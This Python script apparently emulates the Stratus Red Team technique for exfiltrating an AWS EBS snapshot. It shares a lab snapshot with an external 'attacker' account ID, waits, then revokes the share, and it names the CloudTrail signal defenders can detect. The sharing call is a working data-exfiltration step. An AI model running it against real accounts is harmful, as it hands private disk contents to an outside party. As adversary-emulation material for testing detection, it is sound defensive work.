"""
Technique : aws.exfiltration.ec2-share-ebs-snapshot
Tactic    : Exfiltration (T1537)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the EBS volume and snapshot.
  - AWS credentials must have ec2:ModifySnapshotAttribute + ec2:DescribeSnapshots.

Note: If EBS encryption by default is enabled in your region, the sharing step
      will fail with an encryption error. The CloudTrail event is still generated.
      This matches Stratus's own behavior — it treats this as a successful detonation.

Detection signal:
  - ec2:ModifySnapshotAttribute with Attribute=createVolumePermission adding
    an external AWS account ID.

Revert:
  - attack.py automatically removes the sharing permission after a configurable delay.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3

# External attacker-controlled account (Stratus default)
ATTACKER_ACCOUNT_ID = os.environ.get("ATTACKER_ACCOUNT_ID", "012345678912")
DWELL_TIME_S        = int(os.environ.get("DWELL_TIME_S", "15"))


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    snapshot_id = infra.get("snapshot_id", "")

    if not snapshot_id:
        print("[!] snapshot_id not in stack output — did you run pulumi up?")
        return

    session   = boto3.Session()
    ec2_client = session.client("ec2")

    # ── Step 1: Share snapshot with external account ───────────────────────────
    banner("Step 1 — Share EBS snapshot with external account (ModifySnapshotAttribute)")
    print(f"  Snapshot   : {snapshot_id}")
    print(f"  Target acct: {ATTACKER_ACCOUNT_ID}")
    try:
        ec2_client.modify_snapshot_attribute(
            SnapshotId=snapshot_id,
            Attribute="createVolumePermission",
            CreateVolumePermission={"Add": [{"UserId": ATTACKER_ACCOUNT_ID}]},
        )
        print("  [+] Snapshot shared successfully")
    except ec2_client.exceptions.ClientError as e:
        code = e.response["Error"]["Code"]
        if "encrypted" in str(e).lower() or code in ("InvalidParameter", "OperationNotPermitted"):
            print(f"  [!] Share blocked by EBS encryption-by-default ({code})")
            print("  [!] CloudTrail event still generated — this is expected per Stratus design")
        else:
            raise

    print("  [!] CloudTrail event: ec2:ModifySnapshotAttribute (createVolumePermission Add)")

    # ── Dwell ─────────────────────────────────────────────────────────────────
    if DWELL_TIME_S > 0:
        print(f"\n[*] Snapshot shared for {DWELL_TIME_S}s (DWELL_TIME_S)")
        time.sleep(DWELL_TIME_S)

    # ── Revert: Remove sharing permission ─────────────────────────────────────
    banner("Revert — Remove snapshot sharing (ModifySnapshotAttribute Remove)")
    try:
        ec2_client.modify_snapshot_attribute(
            SnapshotId=snapshot_id,
            Attribute="createVolumePermission",
            CreateVolumePermission={"Remove": [{"UserId": ATTACKER_ACCOUNT_ID}]},
        )
        print(f"  [+] Sharing permission removed for account: {ATTACKER_ACCOUNT_ID}")
    except Exception as e:
        print(f"  [!] Revert skipped (likely already unshared or encrypted): {e}")

    banner("Complete")
    print("CloudTrail event generated: ec2:ModifySnapshotAttribute")
    print("Run `pulumi destroy` in ../infra/ to remove the volume and snapshot.")


if __name__ == "__main__":
    main()
